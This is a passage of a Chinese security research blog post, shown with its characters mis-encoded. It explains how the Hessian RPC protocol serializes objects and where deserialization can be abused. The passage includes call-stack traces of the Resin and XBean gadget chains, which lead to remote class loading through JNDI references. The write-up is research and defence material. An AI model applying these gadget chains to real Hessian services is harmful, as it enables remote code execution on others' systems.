class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> implements Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> serialVersionUID = <span class="hljs-number">153519254199840035L</span>;<br>    <span class="hljs-type">String</span> userName = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-type">String</span> password = <span class="hljs-string">&quot;pwnull&quot;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">User</span><span class="hljs-params">(<span class="hljs-type">String</span> user, <span class="hljs-type">String</span> pwd)</span></span>&#123;<br>        <span class="hljs-keyword">this</span>.userName = user;<br>        <span class="hljs-keyword">this</span>.password = pwd;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getUserName</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> userName;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getPassword</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> password;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å®¢æˆ·ç«¯è°ƒç”¨ï¼š</p><p>åŒæ ·å¼•å…¥com.caucho-hessian-4.0.63.jarï¼Œå†åˆ›å»ºä¸æœåŠ¡ç«¯ä¸€æ ·çš„BasicServiceæ¥å£åŠUser pojoç±»ï¼Œå®¢æˆ·ç«¯é€šè¿‡HessianProxyFactoryå·¥å‚ç±»åˆ›å»ºä»£ç†å¯¹è±¡å¹¶è¿›è¡Œæ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> com.caucho.hessian.client.HessianProxyFactory;<br><span class="hljs-keyword">import</span> com.example.hessianserver.BasicAPI;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">hessianClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;http://127.0.0.1:8080/hessian&quot;</span>;<br>        <span class="hljs-type">SnmpAcl</span> <span class="hljs-variable">snmpAcl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SnmpAcl</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-type">HessianProxyFactory</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianProxyFactory</span>();<br>        <span class="hljs-comment">//factory.setHessian2Request(true);</span><br>        <span class="hljs-comment">//factory.setHessian2Reply(true);</span><br>        <span class="hljs-type">BasicAPI</span> <span class="hljs-variable">basic</span> <span class="hljs-operator">=</span> (BasicAPI) factory.create(BasicAPI.class, url);<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.hello());<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.getUser().getUserName());<br>        System.out.println(<span class="hljs-string">&quot;Hello:&quot;</span> + basic.getUser().getPassword());<br>        <span class="hljs-comment">//System.out.println(basic.getObject(snmpAcl));</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/11.png"></p><p>å¦‚ä¸‹åˆ†ææ˜¯åŸºäºæœ€æ–°ç‰ˆ4.0.63ï¼Œç”±äºä¹‹å‰é‡ç‚¹åˆ†æè¿‡rmiåè®®ï¼Œå†æ¬¡çœ‹hessian RPCåè®®æ—¶æ„Ÿè§‰éå¸¸é¡ºç•…ã€‚æ•´ä½“æµç¨‹ä¸RMIç±»ä¼¼ï¼Œä½†æ˜¯å¯¹äºè‡ªå®šä¹‰ç±»çš„å¤„ç†ä¸RMIä¸åŒï¼Œå› æ­¤ç›¸å¯¹åº”çš„æ¼æ´åˆ©ç”¨æ–¹å¼ä¹Ÿæœ‰äº›åŒºåˆ«ã€‚ç»§ç»­çœ‹</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-built_in">String</span> url =<span class="hljs-string">&quot;http://127.0.0.1:8080/hessian&quot;</span>;<br>HessianProxyFactory <span class="hljs-keyword">factory</span> = <span class="hljs-keyword">new</span> HessianProxyFactory();<br>BasicAPI basic = (BasicAPI) <span class="hljs-keyword">factory</span>.create(BasicAPI.<span class="hljs-keyword">class</span>, url);<br>basic.hello();<br></code></pre></td></tr></table></figure><p>åœ¨å®¢æˆ·ç«¯è°ƒç”¨è¿œç«¯çš„helloæ–¹æ³•æ—¶ï¼Œå¤„ç†é€»è¾‘åœ¨com.caucho.hessian.client.HessianProxy#invokeä¸­ï¼š1ã€åˆ¤æ–­è°ƒç”¨æ–¹æ³•æ˜¯å¦æ˜¯å†…ç½®æ–¹æ³•ï¼Œå¦‚æœæ˜¯é‚£ä¹ˆä¼šåœ¨æœ¬åœ°æ‰§è¡Œå¹¶è¿”å›ç»“æœï¼›2ã€å¦‚æœæ˜¯è¿œç«¯æ–¹æ³•ï¼Œä¼šè°ƒç”¨HessianProxy#sendRequestè¿›è¡Œæ•°æ®ç»„è£…å¹¶å‘é€ï¼›3ã€å®¢æˆ·ç«¯ç­‰å¾…æœåŠ¡ç«¯è¿”å›æ–¹æ³•çš„æ‰§è¡Œç»“æœï¼ŒHessianä¼ è¾“çš„æ˜¯åºåˆ—åŒ–æ•°æ®ï¼Œæ‰€ä»¥åœ¨æ‹¿åˆ°ç»“æœåéœ€è¦è¿›è¡Œååºåˆ—åŒ–è¯»å–</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/12.png"></p><p>åœ¨HessianProxy#sendRequestä¸­æ·»åŠ Hessiançš„headerè¯·æ±‚å¤´ã€åœ¨HessianOutput#callä¸­ç»„è£…æ•°æ®ã€åºåˆ—åŒ–å†™å…¥å‚æ•°å¯¹è±¡</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/13.png"></p><p>å®¢æˆ·ç«¯è°ƒç”¨Hessian2Input#readReply ååºåˆ—åŒ–è¯»å–æœåŠ¡ç«¯çš„è¿”å›æ•°æ®</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/14.png"></p><p>æœåŠ¡ç«¯åœ¨HessianServlet#serviceæ–¹æ³•ä¸­å¤„ç†å®¢æˆ·ç«¯çš„è°ƒç”¨è¯·æ±‚</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/15.png"></p><p>åœ¨HessianSkeleton#invokeä¸­è¯»å–æ•°æ®çš„headerå­—æ®µï¼Œè¿™é‡Œé»˜è®¤æ˜¯CALL_1_REPLY_2ï¼Œè¡¨ç¤ºä½¿ç”¨ç‰ˆæœ¬åè®®1è°ƒç”¨ï¼Œä½¿ç”¨ç‰ˆæœ¬åè®®2è¿”å›ï¼Œå¹¶åˆ›å»ºäº†å¯¹åº”ç‰ˆæœ¬çš„HessianInputï¼ˆç‰ˆæœ¬1ï¼‰è¾“å…¥æµã€Hessian2Outputï¼ˆç‰ˆæœ¬2ï¼‰è¾“å‡ºæµ</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/16.png"></p><p>åœ¨HessianSkeleton#invokeæ–¹æ³•ä¸­ï¼š1ã€è·å–ç›®æ ‡æ–¹æ³•ï¼›2ã€è·å–æ–¹æ³•å¯¹åº”å‚æ•°ï¼›3ã€åå°„è°ƒç”¨ï¼›4ã€å°†æ–¹æ³•çš„æ‰§è¡Œç»“æœé€šè¿‡AbstractHessianOutput#writeReplyæ–¹æ³•å†™å…¥æµä¸­å¹¶ä¼ å›ç»™å®¢æˆ·ç«¯</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/17.png"></p><p>æœåŠ¡ç«¯åœ¨å¤„ç†è¿‡ç¨‹ä¸­ç”¨åˆ°çš„å‡ ä¸ªé‡ç‚¹ç±»åŠæ–¹æ³•</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.services</span><span class="hljs-selector-class">.server</span>.AbstractSkeleton<span class="hljs-selector-id">#AbstractSkeleton</span><br>åˆå§‹åŒ–æ—¶æ¥æ”¶è°ƒç”¨æ¥å£ç±»å‹ï¼Œå¹¶å°†æ¥å£æ–¹æ³•æ·»åŠ åˆ°å±æ€§_methodMapä¸­ï¼Œå…¶æ ¼å¼ä¸ºï¼šæ–¹æ³•å__å‚æ•°é•¿åº¦ã€æ–¹æ³•å_å‚æ•°<span class="hljs-number">1</span>ç±»å‹_å‚æ•°<span class="hljs-number">2</span>ç±»å‹<br><br>com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span><span class="hljs-selector-class">.server</span><span class="hljs-selector-class">.HessianSkeleton</span><br>ç»§æ‰¿è‡ªAbstractSkeletonï¼Œåˆå§‹åŒ–æ—¶æ¥æ”¶æ¥å£ä¸å®ç°ç±»ï¼Œå¹¶å°†å®ç°ç±»èµ‹å€¼ç»™å±æ€§service<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/18.png"></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/19.png"></p><p>å¦‚ä¸Šæ˜¯ä¸€æ¬¡å®Œæ•´çš„å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„è°ƒç”¨äº¤äº’è¿‡ç¨‹ï¼Œåœ¨è°ƒç”¨åºåˆ—åŒ–writeObject&#x2F;ååºåˆ—åŒ–readObjectæ–¹æ³•æ—¶ï¼Œéƒ½ä¼šæ ¹æ®ç›®æ ‡ç±»å‹é€‰æ‹©ä¸åŒçš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨ã€‚æˆ‘ä»¬æ•´ä½“æ¥çœ‹ä¸‹</p><h4 id="3-2-2-åºåˆ—åŒ–-x2F-ååºåˆ—åŒ–å™¨"><a href="#3-2-2-åºåˆ—åŒ–-x2F-ååºåˆ—åŒ–å™¨" class="headerlink" title="3.2.2 åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨"></a>3.2.2 åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨</h4><p>æ ¹æ®<code>SerializerFactory#getDefaultSerializerè·Ÿ</code>æ¥åˆ†æï¼Œé»˜è®¤çš„åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–å™¨æ˜¯ UnsafeSerializer&#x2F;UnsafeDeserializerï¼Œå½“å®¢æˆ·ç«¯åºåˆ—åŒ–è‡ªå®šä¹‰Objectå¯¹è±¡ï¼ˆä¾‹å­ä¸ºSnmpAclå¯¹è±¡ï¼‰æ—¶ï¼Œä¼šè°ƒç”¨UnsafeSerializer#writeObjectï¼Œè¿™ä¸ªæ–¹æ³•å…¼å®¹äº†Hessian1ä¸Hessian2çš„æ ¼å¼å†™æ³•ï¼šç»Ÿä¸€è°ƒç”¨AbstractHessianOutput#writeObjectBeginï¼ŒHessian1çš„HessianOutputæœªå®ç°æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°HessianOutput#writeMapBeginå†™å…¥Mapçš„æ ¼å¼æ•°æ®ï¼Œè€ŒHessian2å®ç°äº†æ­¤æ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨åˆ°Hessian2Output#writeObjectBeginï¼Œä¸å†™å…¥Mapçš„æ ¼å¼æ•°æ®</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/20.png"></p><p>com.caucho.hessian.io.AbstractHessianOutput#writeObjectBegin</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/21.png"></p><p>Hessian1è‡ªå®šä¹‰ç±»å‹çš„åºåˆ—åŒ–åˆå§‹æ–¹æ³•ï¼šcom.caucho.hessian.io.HessianOutput#writeMapBegin</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/22.png"></p><p>Hessian2è‡ªå®šä¹‰ç±»å‹çš„åºåˆ—åŒ–åˆå§‹æ–¹æ³•ï¼šcom.caucho.hessian.io.Hessian2Output#writeObjectBegin</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/23.png"></p><p>å½“ä½¿ç”¨Hessian1åè®®ä¼ è¾“è‡ªå®šä¹‰æ•°æ®ç±»å‹æ—¶ï¼ŒæœåŠ¡ç«¯æ€»ä¼šä½¿ç”¨UnsafeDeserializer#readMapè¿›è¡Œå¤„ç†ï¼š1ã€ä½¿ç”¨_unsafe.allocateInstanceåˆ›å»ºç›®æ ‡ç±»å®ä¾‹ï¼›2ã€è°ƒç”¨ç›®æ ‡ç±»å±æ€§å¯¹åº”ç±»å‹çš„ååºåˆ—åŒ–å™¨ï¼ŒreadXXXæ–¹æ³•è¯»å–å±æ€§å€¼å¹¶è°ƒç”¨Unsafe#putObjectå†™å…¥</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/24.png"></p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/25.png"></p><p>å½“ä½¿ç”¨Hessian2åè®®ä¼ è¾“è‡ªå®šä¹‰æ•°æ®ç±»å‹æ—¶ï¼ŒæœåŠ¡ç«¯ä¼šä½¿ç”¨UnsafeDeserializer#readObjectè¿›è¡Œå¤„ç†ï¼š1ã€ä½¿ç”¨_unsafe.allocateInstanceåˆ›å»ºç›®æ ‡ç±»å®ä¾‹ï¼›2ã€è°ƒç”¨ç›®æ ‡ç±»å±æ€§å¯¹åº”ç±»å‹çš„ååºåˆ—åŒ–å™¨ï¼ŒreadXXXæ–¹æ³•è¯»å–å±æ€§å€¼å¹¶è°ƒç”¨Unsafe#putObjectå†™å…¥</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/26.png"></p><p>æ‰€ä»¥åœ¨Hessian1ä¸­ï¼Œè‡ªå®šä¹‰æ•°æ®ç±»å‹éƒ½æ˜¯åŒ…è£…ä¸ºMapç±»å‹è¿›è¡Œåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œçš„ï¼ŒHessian1æ²¡æœ‰å¯¹Objectè¿›è¡Œå•ç‹¬å¤„ç†ã€‚åˆ°äº†Hessian2ä¸­ï¼Œæ‰å¯¹è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆObjectï¼‰è¿›è¡Œäº†å•ç‹¬å¤„ç†ã€‚è¿™ä¸ªç‰¹æ€§éœ€è¦æ³¨æ„ä¸‹ã€‚</p><p>å¦å¤–è¦æ³¨æ„å®¢æˆ·ç«¯é»˜è®¤ä¸ºHessian1æ ¼å¼è¯·æ±‚ã€ä»¥Hessian2æ ¼å¼å“åº”ï¼Œå³ä¸Šé¢æåˆ°çš„headerå­—æ®µ<code>CALL_1_REPLY_2</code>ï¼Œå½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨setHessian2Request&#x2F;setHessian2Replyæ–¹æ³•æ˜¾å¼æŒ‡å®šè¯·æ±‚åŠå“åº”çš„åè®®ç‰ˆæœ¬</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dart">HessianProxyFactory <span class="hljs-keyword">factory</span> = <span class="hljs-keyword">new</span> HessianProxyFactory();<br><span class="hljs-keyword">factory</span>.setHessian2Request(<span class="hljs-keyword">true</span>);<br><span class="hljs-keyword">factory</span>.setHessian2Reply(<span class="hljs-keyword">true</span>);<br></code></pre></td></tr></table></figure><p>com.caucho.hessian.client.HessianProxyFactory#getHessianOutput </p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/27.png"></p><h4 id="3-2-3-Serializableæ¥å£é—®é¢˜"><a href="#3-2-3-Serializableæ¥å£é—®é¢˜" class="headerlink" title="3.2.3 Serializableæ¥å£é—®é¢˜"></a>3.2.3 Serializableæ¥å£é—®é¢˜</h4><p>å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ï¼Œè·å–é»˜è®¤åºåˆ—åŒ–å™¨UnsafeSerializeræ—¶ä¼šåˆ¤æ–­ç±»æ˜¯å¦å®ç°Serializableæ¥å£ï¼Œæˆ–è€…<strong>åˆ¤æ–­æ˜¯å¦è®¾ç½®äº†å˜é‡isAllowNonSerializable</strong>ï¼Œå¦‚æœisAllowNonSerializableè®¾ç½®ä¸ºtrueï¼Œåˆ™å…è®¸åºåˆ—åŒ–æœªå®ç°Serializableæ¥å£çš„ç±»ï¼Œå¹¶ä¸”æœåŠ¡ç«¯ä¸ä¼šæ£€æµ‹ç±»æ˜¯å¦å®ç°äº†Serializableæ¥å£ã€‚<strong>è¿™ä¸ªæ˜¯ä¸JavaåŸç”Ÿååºåˆ—åŒ–ä¸åŒçš„ä¸€ä¸ªç‚¹ï¼šHessianå¯ä»¥å¯¹æœªå®ç°Serializableæ¥å£çš„ç±»å¯¹è±¡è¿›è¡Œåºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–æ“ä½œ</strong></p><p>com.caucho.hessian.io.SerializerFactory#getDefaultSerializer</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/28.png"></p><h3 id="3-3-æ¼æ´åŠåˆ©ç”¨"><a href="#3-3-æ¼æ´åŠåˆ©ç”¨" class="headerlink" title="3.3 æ¼æ´åŠåˆ©ç”¨"></a>3.3 æ¼æ´åŠåˆ©ç”¨</h3><p>ä»ä¸Šé¢çš„åˆ†æèƒ½çœ‹å‡ºæ¥ï¼Œæ— è®ºHessian1è¿˜æ˜¯2ï¼Œåœ¨å¤„ç†è‡ªå®šä¹‰ç±»å‹ï¼ˆObjectï¼‰å¯¹è±¡éƒ½æ˜¯é€šè¿‡<code>_unsafe.allocateInstance</code>åˆ›å»ºå®ä¾‹ã€readObjectè·å–å€¼ã€<code>Unsafe#putObject</code>å†™å…¥å±æ€§å€¼ã€‚å…¶ä¸­readObjectæ–¹æ³•ä¸javaåŸç”Ÿååºåˆ—åŒ–æµç¨‹ä¹Ÿä¸åŒï¼Œä¸ä¼šåœ¨è¿‡ç¨‹ä¸­è°ƒç”¨ç›®æ ‡ç±»çš„readObjectæ–¹æ³•ã€‚ä¸fastjsonååºåˆ—åŒ–ä¹Ÿä¸åŒï¼Œä¸ä¼šè°ƒç”¨ç›®æ ‡å±æ€§çš„getter&#x2F;setteræ–¹æ³•è¿›è¡Œèµ‹å€¼ã€‚é‚£ä¹ˆæœ‰å“ªäº›è§¦å‘ç‚¹å¯ä»¥ä¾›æˆ‘ä»¬ä½¿ç”¨ï¼Ÿç­”æ¡ˆå°±æ˜¯Mapï¼Mapåœ¨Hessianååºåˆ—åŒ–ä¸­å æœ‰é‡è¦åœ°ä½</p><p>Hessianå¯¹äºMapç±»å‹çš„ååºåˆ—åŒ–å¤„ç†åœ¨com.caucho.hessian.io.MapDeserializer#readMapä¸­ï¼Œåˆå§‹åŒ–HashMapã€TreeMapï¼Œæ¥ç€è°ƒç”¨å„è‡ªçš„putæ–¹æ³•ï¼Œè€Œmapçš„putæ–¹æ³•ä¸€ç›´æ˜¯ååºåˆ—åŒ–é“¾çš„â€æ˜æ˜Ÿâ€æ–¹æ³•ï¼Œå‡ºåœºç‡æé«˜ã€‚</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/29.png"></p><p>java.util.HashMap#putä¼šè°ƒç”¨åˆ°keyçš„hashCodeã€equalsæ–¹æ³•æ£€æŸ¥keyæ˜¯å¦é‡å¤</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/30.png"></p><p>java.util.TreeMap#putä¼šè°ƒç”¨keyçš„compareToã€comparatorå±æ€§çš„compareæ–¹æ³•è¿›è¡Œæ’åº</p><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/31.png"></p><p>æ‰€ä»¥å¯»æ‰¾hessianååºåˆ—åŒ–é“¾çš„è¦ç‚¹ï¼š</p><p>1ã€èµ·ç‚¹æ˜¯hashCode&#x2F;equals&#x2F;compareToç­‰æ–¹æ³•</p><p>2ã€æ‰§è¡Œæ–¹æ³•ä¸ä¾èµ–ç±»æœ¬èº«readObject&#x2F;getter&#x2F;setterç­‰æ–¹æ³•çš„é€»è¾‘</p><p>3ã€æ— è®ºç›®æ ‡ç±»æ˜¯å¦å®ç°Serializableæ¥å£ï¼Œéƒ½ä¸å½±å“ååºåˆ—åŒ–æ“ä½œ</p><p>4ã€ç›®æ ‡ç±»çš„æ„é€ æ–¹æ³•å¿…é¡»æ˜¯publicçŠ¶æ€ï¼ˆ_unsafe.allocateInstanceåˆ›å»ºå®ä¾‹æ—¶å¹¶æœªè°ƒç”¨setAccessableè®¾ç½®ï¼‰</p><p>hessianç›®å‰åœ¨ <a href="https://github.com/mbechler/marshalsec">https://github.com/mbechler/marshalsec</a> ä¸­çš„é“¾ï¼šRomeã€XBeanã€Resinã€SpringPartiallyComparableAdvisorHolderã€SpringAbstractBeanFactoryPointcutAdvisorï¼ŒæŒ‘XBeanä¸Resinåˆ†æä¸‹ï¼Œå†çœ‹çœ‹JDKåŸç”Ÿçš„ä¸¤æ¡é“¾</p><h4 id="3-3-1-Resinåˆ©ç”¨é“¾"><a href="#3-3-1-Resinåˆ©ç”¨é“¾" class="headerlink" title="3.3.1 Resinåˆ©ç”¨é“¾"></a>3.3.1 Resinåˆ©ç”¨é“¾</h4><p>Resinåˆ©ç”¨é“¾å…¥å£æ˜¯com.sun.org.apache.xpath.internal.objects.XString#equalsæ–¹æ³•ï¼Œæœ€ç»ˆè§¦å‘ç‚¹æ˜¯ javax.naming.spi.NamingManager#getObjectFactoryFromReferenceè¿œç¨‹åŠ è½½ç±»ï¼Œé«˜ç‰ˆæœ¬çš„JDKå…³é—­äº†åŠ è½½ï¼Œä½†æ˜¯å­˜åœ¨ä¸€äº›factoryçš„ç»•è¿‡ï¼Œä¸è¿‡å¤šé˜è¿°ã€‚åœ¨ç¬”è€…ä¹‹å‰çš„JNDIæ³¨å…¥æ–‡ç« è¯´æ˜è¿‡ï¼š<a href="https://pwnull.github.io/2022/jndi-injection-history/">https://pwnull.github.io/2022/jndi-injection-history/</a></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getObjectFactoryFromReference:</span><span class="hljs-number">156</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getObjectInstance:</span><span class="hljs-number">319</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getContext:</span><span class="hljs-number">439</span>, NamingManager (javax.naming.spi)<br><span class="hljs-symbol">getTargetContext:</span><span class="hljs-number">55</span>, ContinuationContext (javax.naming.spi)<br><span class="hljs-symbol">composeName:</span><span class="hljs-number">180</span>, ContinuationContext (javax.naming.spi)<br><span class="hljs-symbol">toString:</span><span class="hljs-number">353</span>, QName (<span class="hljs-keyword">com</span>.caucho.naming)<br><span class="hljs-symbol">equals:</span><span class="hljs-number">392</span>, XString (<span class="hljs-keyword">com</span>.sun<span class="hljs-meta">.org</span>.apache.xpath.internal.objects)<br><span class="hljs-symbol">putVal:</span><span class="hljs-number">634</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">611</span>, HashMap (java.util)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">114</span>, MapDeserializer (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readMap:</span><span class="hljs-number">577</span>, SerializerFactory (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br><span class="hljs-symbol">readObject:</span><span class="hljs-number">1160</span>, HessianInput (<span class="hljs-keyword">com</span>.caucho.hessian.io)<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/32.png"></p><h4 id="3-3-2-XBeanåˆ©ç”¨é“¾"><a href="#3-3-2-XBeanåˆ©ç”¨é“¾" class="headerlink" title="3.3.2 XBeanåˆ©ç”¨é“¾"></a>3.3.2 XBeanåˆ©ç”¨é“¾</h4><p>XBeanåˆ©ç”¨é“¾ä¸resinçš„å¾ˆç±»ä¼¼ï¼Œå‡åˆ©ç”¨äº†XString#equalsã€è§¦å‘ç‚¹NamingManager#getObjectFactoryFromReferenceï¼Œåªä¸è¿‡ç”±QNameæ¢æˆäº†Bindingã€‚ç•™ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆä¸ä½¿ç”¨XStringç›´æ¥å»è§¦å‘ï¼Œè€Œæ˜¯è¦ä½¿ç”¨springä¸­çš„HotSwappableTargetSource</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">getObjectFactoryFromReference:<span class="hljs-number">156</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>getObjectInstance:<span class="hljs-number">319</span>, NamingManager (javax<span class="hljs-selector-class">.naming</span>.spi)<br>resolve:<span class="hljs-number">73</span>, ContextUtil (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)<br>getObject:<span class="hljs-number">204</span>, ContextUtil<span class="hljs-variable">$ReadOnlyBinding</span> (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xbean</span><span class="hljs-selector-class">.naming</span>.context)<br>toString:<span class="hljs-number">192</span>, Binding (javax.naming)<br>equals:<span class="hljs-number">392</span>, XString (com<span class="hljs-selector-class">.sun</span><span class="hljs-selector-class">.org</span><span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.xpath</span><span class="hljs-selector-class">.internal</span>.objects)<br>equals:<span class="hljs-number">104</span>, HotSwappableTargetSource (org<span class="hljs-selector-class">.springframework</span><span class="hljs-selector-class">.aop</span>.target)<br>putVal:<span class="hljs-number">634</span>, HashMap (java.util)<br>put:<span class="hljs-number">611</span>, HashMap (java.util)<br>readMap:<span class="hljs-number">114</span>, MapDeserializer (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br>readMap:<span class="hljs-number">577</span>, SerializerFactory (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br>readObject:<span class="hljs-number">1160</span>, HessianInput (com<span class="hljs-selector-class">.caucho</span><span class="hljs-selector-class">.hessian</span>.io)<br></code></pre></td></tr></table></figure><p><img src="/img/from-Ali-Nacos-RCE-to-RPC-Hessian-protocol-security/33.png"></p><h4 id="3-3-3-JDKåŸç”Ÿé“¾"><a href="#3-3-3-JDKåŸç”Ÿé“¾" class="headerlink" title="3.3.3 JDKåŸç”Ÿé“¾"></a>3.3.3 JDKåŸç”Ÿé“¾</h4><p>0ctf2022çš„é¢˜ç›® hessian only jdkï¼Œé¢˜ç›®é¢„æœŸè§£æ˜¯å¯»æ‰¾åªä¾èµ–äºjdkçš„Hessianååºåˆ—åŒ–åˆ©ç”¨é“¾ã€‚é¢˜ç›®ä¿¡æ¯åœ¨è¿™é‡Œï¼š<a href="https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk">https://github.com/waderwu/My-CTF-Challenges/tree/master/0ctf-2022/hessian-onlyJdk</a>  